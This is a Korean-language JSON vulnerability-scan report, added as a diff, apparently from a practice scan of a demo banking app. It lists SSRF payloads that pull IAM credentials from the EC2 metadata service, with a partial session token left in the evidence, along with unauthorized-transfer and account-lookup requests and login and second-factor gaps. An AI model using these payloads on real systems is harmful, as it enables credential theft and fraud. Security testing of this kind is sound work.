@@ -1,0 +1,206 @@
+{
+  "target": "http://52.79.242.217:3000/",
+  "scan_time": "20260515_135732",
+  "scanner_results": {
+    "SSRF": {
+      "scan_id": "SSRF",
+      "target": "http://52.79.242.217:8000",
+      "scan_time": "2026-05-15 13:57:32",
+      "vulnerabilities": [
+        {
+          "id": "SSRF-001",
+          "type": "SSRF",
+          "severity": "High",
+          "status": "취약",
+          "owasp": "A10:2021 - Server-Side Request Forgery",
+          "endpoint": "/exchange/rate",
+          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "detected_keywords": [
+            "meta-data"
+          ],
+          "evidence": "IAM 역할명(RookiesBank-EC2-Role) 노출 확인",
+          "description": "IAM 역할 목록 노출 — 역할명 파악 후 크레덴셜 탈취 시도 가능",
+          "_scanner": "SSRF"
+        },
+        {
+          "id": "SSRF-002",
+          "type": "SSRF",
+          "severity": "Critical",
+          "status": "취약",
+          "owasp": "A10:2021 - Server-Side Request Forgery",
+          "endpoint": "/exchange/rate",
+          "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/RookiesBank-EC2-Role",
+          "detected_keywords": [
+            "AccessKeyId",
+            "SecretAccessKey",
+            "Token"
+          ],
+          "evidence": "{\n  \"Code\" : \"Success\",\n  \"LastUpdated\" : \"2026-05-15T04:57:49Z\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"****MASKED****\",\n  \"SecretAccessKey\" : \"****MASKED****\",\n  \"Token\" : \"IQoJb3JpZ2luX2VjEKX//////////wEaDmFwLW5vcnRoZWFzdC0yIkgwRgIhAI9pDrtkK4J6MSjTZ5rHqPY7rcLkCt",
+          "description": "IAM 임시 크레덴셜(AccessKeyId, SecretAccessKey, Token) 탈취 성공 — AWS 서비스 무단 접근 가능",
+          "_scanner": "SSRF"
+        },
+        {
+          "id": "SSRF-003",
+          "type": "SSRF",
+          "severity": "High",
+          "status": "취약",
+          "owasp": "A10:2021 - Server-Side Request Forgery",
+          "endpoint": "/exchange/rate",
+          "payload": "http://169.254.169.254/latest/meta-data/",
+          "detected_keywords": [
+            "meta-data"
+          ],
+          "evidence": "노출 항목: ami-id, ami-launch-index, ami-manifest-path, block-device-mapping/, events/, hostname, iam/, identity-credentials/, instance-action, instance-id...",
+          "description": "EC2 인스턴스 메타데이터 전체 노출 — 인스턴스 ID, 호스트명, 네트워크 정보 등 수집 가능",
+          "_scanner": "SSRF"
+        }
+      ]
+    },
+    "BOLA": {
+      "scan_id": "BOLA",
+      "target": "http://52.79.242.217:8000",
+      "scan_time": "2026-05-15 13:57:32",
+      "vulnerabilities": [
+        {
+          "id": "BOLA-001",
+          "type": "BOLA",
+          "severity": "Critical",
+          "status": "취약",
+          "owasp": "A01:2021 - Broken Access Control",
+          "endpoint": "/transfer",
+          "payload": "from_account_id=2 (bob 계좌)",
+          "detected_keywords": [
+            "Transfer successful"
+          ],
+          "evidence": "{\"message\":\"Transfer successful\"}",
+          "description": "타인 계좌(bob)에서 본인 계좌(alice)로 무단 이체 성공 — 출금 계좌 소유자 검증 없음",
+          "_scanner": "BOLA"
+        },
+        {
+          "id": "BOLA-002",
+          "type": "BOLA",
+          "severity": "High",
+          "status": "취약",
+          "owasp": "A01:2021 - Broken Access Control",
+          "endpoint": "/transfer/history?account_id=4",
+          "payload": "account_id=4 (admin 계좌)",
+          "detected_keywords": [
+            "from_account_id",
+            "amount"
+          ],
+          "evidence": "admin 거래내역 0건 무단 조회 성공",
+          "description": "admin 계좌 거래 내역 무단 조회 — account_id 소유자 검증 없음",
+          "_scanner": "BOLA"
+        }
+      ]
+    },
+    "IDOR": {
+      "scan_id": "IDOR",
+      "target": "http://52.79.242.217:8000",
+      "scan_time": "2026-05-15 13:57:32",
+      "vulnerabilities": [
+        {
+          "id": "IDOR-002",
+          "type": "IDOR",
+          "severity": "High",
+          "status": "취약",
+          "owasp": "A01:2021 - Broken Access Control",
+          "endpoint": "/accounts?id=2",
+          "payload": "id=2",
+          "detected_keywords": [
+            "account_number",
+            "balance"
+          ],
+          "evidence": "타인 계좌 조회 성공 - 계좌번호: 110-2024-000002, 잔액: 857000.0",
+          "description": "alice 계정으로 id=2 타인 계좌 무단 조회 — 소유자 검증 없음",
+          "_scanner": "IDOR"
+        },
+        {
+          "id": "IDOR-003",
+          "type": "IDOR",
+          "severity": "High",
+          "status": "취약",
+          "owasp": "A01:2021 - Broken Access Control",
+          "endpoint": "/accounts?id=3",
+          "payload": "id=3",
+          "detected_keywords": [
+            "account_number",
+            "balance"
+          ],
+          "evidence": "타인 계좌 조회 성공 - 계좌번호: 110-2024-000003, 잔액: 3200000.0",
+          "description": "alice 계정으로 id=3 타인 계좌 무단 조회 — 소유자 검증 없음",
+          "_scanner": "IDOR"
+        },
+        {
+          "id": "IDOR-004",
+          "type": "IDOR",
+          "severity": "High",
+          "status": "취약",
+          "owasp": "A01:2021 - Broken Access Control",
+          "endpoint": "/accounts?id=4",
+          "payload": "id=4",
+          "detected_keywords": [
+            "account_number",
+            "balance"
+          ],
+          "evidence": "타인 계좌 조회 성공 - 계좌번호: 110-2024-000004, 잔액: 50000000.0",
+          "description": "alice 계정으로 id=4 타인 계좌 무단 조회 — 소유자 검증 없음",
+          "_scanner": "IDOR"
+        }
+      ]
+    },
+    "Insecure Design": {
+      "scan_id": "Insecure_Design",
+      "target": "http://52.79.242.217:8000",
+      "scan_time": "2026-05-15 13:57:32",
+      "vulnerabilities": [
+        {
+          "id": "INSECURE-001",
+          "type": "Insecure Design",
+          "severity": "High",
+          "status": "취약",
+          "owasp": "A04:2021 - Insecure Design",
+          "endpoint": "/auth/login",
+          "payload": "잘못된 비밀번호로 5회 연속 로그인 시도",
+          "detected_keywords": [
+            "Too many attempts"
+          ],
+          "evidence": "5회 실패 후에도 로그인 시도 차단 없음",
+          "description": "로그인 실패 횟수 제한 없음 — 브루트포스 공격으로 계정 탈취 가능",
+          "_scanner": "Insecure Design"
+        },
+        {
+          "id": "INSECURE-002",
+          "type": "Insecure Design",
+          "severity": "High",
+          "status": "취약",
+          "owasp": "A04:2021 - Insecure Design",
+          "endpoint": "/transfer",
+          "payload": "이체 요청 후 2차 인증 요구 여부 확인",
+          "detected_keywords": [
+            "2차 비밀번호",
+            "OTP",
+            "추가 인증",
+            "secondary password"
+          ],
+          "evidence": "이체 완료까지 추가 인증 없음",
+          "description": "계좌 이체 시 2차 비밀번호 인증 없음 — 세션 탈취 시 즉시 이체 가능",
+          "_scanner": "Insecure Design"
+        },
+        {
+          "id": "INSECURE-003",
+          "type": "Insecure Design",
+          "severity": "Medium",
+          "status": "양호",
+          "owasp": "A04:2021 - Insecure Design",
+          "endpoint": "/auth/register",
+          "payload": "password=1234 (4자리 숫자)",
+          "detected_keywords": [],
+          "evidence": "약한 비밀번호 차단 확인",
+          "description": "비밀번호 복잡도 검증 없음 — 특수문자, 최소 길이 등 정책 미적용",
+          "_scanner": "Insecure Design"
+        }
+      ]
+    }
+  }
+}
